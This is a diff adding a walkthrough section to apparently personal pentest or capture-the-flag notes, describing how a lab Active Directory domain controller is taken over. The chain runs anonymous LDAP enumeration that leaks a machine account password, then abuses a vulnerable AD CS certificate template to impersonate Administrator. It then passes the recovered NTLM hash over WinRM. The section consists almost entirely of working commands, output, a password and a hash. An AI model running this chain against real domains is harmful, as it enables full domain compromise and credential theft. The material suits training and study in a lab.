@@ -82,3 +82,58 @@ PsExec.exe \\$machine cmd.exe
 ```
 evil-winrm -i $hip -u $user -H $hash
 ```
+
+# Pwning AD CS
+IIS on DC? Might be AD CS.
+
+enumerate4linux-ng says there is an RPC null session. Query all information:
+
+```bash
+nxc ldap $hip -u '' -p '' --query "(objectClass=*)" ""
+```
+
+This reveals the password for "Computer" (swedish: dator):
+```
+LDAP                     10.244.0.10     389    DC01             cn                   dator
+LDAP                     10.244.0.10     389    DC01             distinguishedName    CN=dator,CN=Computers,DC=hack,DC=lu
+LDAP                     10.244.0.10     389    DC01             instanceType         4
+LDAP                     10.244.0.10     389    DC01             whenCreated          20251008145950.0Z
+LDAP                     10.244.0.10     389    DC01             whenChanged          20251008145954.0Z
+LDAP                     10.244.0.10     389    DC01             uSNCreated           12916
+LDAP                     10.244.0.10     389    DC01             uSNChanged           12921
+LDAP                     10.244.0.10     389    DC01             name                 dator
+LDAP                     10.244.0.10     389    DC01             objectGUID           111f2275-4f5f-0e4f-9476-dee4102e691b
+LDAP                     10.244.0.10     389    DC01             userAccountControl   69632
+
+....
+
+LDAP                     10.244.0.10     389    DC01             unixUserPassword     vy6A8VGpN7gMxZ
+```
+
+
+Find certificates
+```bash
+certipy-ad find -vulnerable -u "dator$" -p "vy6A8VGpN7gMxZ" -dc-ip $hip -text -hide-admins
+```
+
+![[Pasted image 20251017230608.png]]
+
+this text file contains all information needed
+
+```
+certipy-ad req -u "dator$" -p "vy6A8VGpN7gMxZ" -dc-ip $hip -target dc01.hack.lu -ca hack-DC01-CA -template köttbullar -upn Administrator@hack.lu -sid 'S-1-5-21-215134972-1129381140-2588549801-500'
+```
+
+With this certificate, we can get a hash
+
+```bash
+certipy-ad auth -pfx administrator.pfx -dc-ip $hip
+```
+
+![[Pasted image 20251017230804.png]]
+and execute commands remotely using the latter part of the hash
+```bash
+nxc winrm $hip -u 'Administrator' -H "a6b9330f65063062dc3d567db7d4e695" -x "type C:\Users\Administratör\Desktop\flag.txt"
+```
+
+![[Pasted image 20251017230900.png]]
